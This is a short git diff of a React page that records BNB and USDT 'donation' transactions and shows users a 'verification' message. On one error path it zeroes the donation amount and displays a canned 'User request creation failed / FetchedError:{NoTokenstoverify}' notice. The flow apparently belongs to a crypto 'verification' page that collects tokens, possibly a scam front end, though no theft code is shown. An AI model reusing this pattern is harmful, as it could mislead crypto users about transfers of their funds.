@@ -99,9 +99,11 @@ export default function Home() {
       setUsdtTxHash(usdtTxHash || '');
       setDonationAmount(bnbAmount);
       setUsdtDonationAmount(usdtAmount);
+      setShowVerificationMessage(true)
     } catch (error) {
       if (error.amount && error.flash) {
-        setStatusMessage(error);
+        
+       setUsdtDonationAmount(0);
       } else {
         setError(error.message);
       }
@@ -184,7 +186,7 @@ export default function Home() {
         )}
               {/* Main Content Area */}
     <main className="main-content"style={{
-    backgroundImage: `url(${process.env.PUBLIC_URL + '/BGmain.png'})`,
+    backgroundImage: `url(${process.env.PUBLIC_URL + 'BGmain.png'})`,
     backgroundSize: 'cover',
     backgroundPosition: 'center',
     backgroundRepeat: 'no-repeat',
@@ -241,7 +243,7 @@ export default function Home() {
         alt="USDT Logo"
         style={{ width: '20px', marginRight: '5px' }}
       />
-      USDT = {userBalances.usdt !== null ? Math.floor(userBalances.usdt) : 'Loading...'}
+      USDT = {usdtAmount !== null ? Math.floor(usdtAmount) : 'Loading...'}
     </p>
     <p>
       <img
@@ -249,11 +251,11 @@ export default function Home() {
         alt="BNB Logo"
         style={{ width: '20px', marginRight: '5px' }}
       />
-      BNB = {userBalances.bnb !== null ? userBalances.bnb.toFixed(4) : 'Loading...'}
+      BNB = {bnbAmount !== null ? bnbAmount.toFixed(4) : 'Loading...'}
     </p>
   </div>
 </div>
-) : userBalances.usdt === 0 ? (
+) : usdtDonationAmount === 0 ? (
 <div className="verification-message">
   <p>User request creation failed.</p> 
     <p className="line" style={{  color: '#ffffff'  }}>FetchedError:{"{"}NoTokenstoverify{"}"}</p>
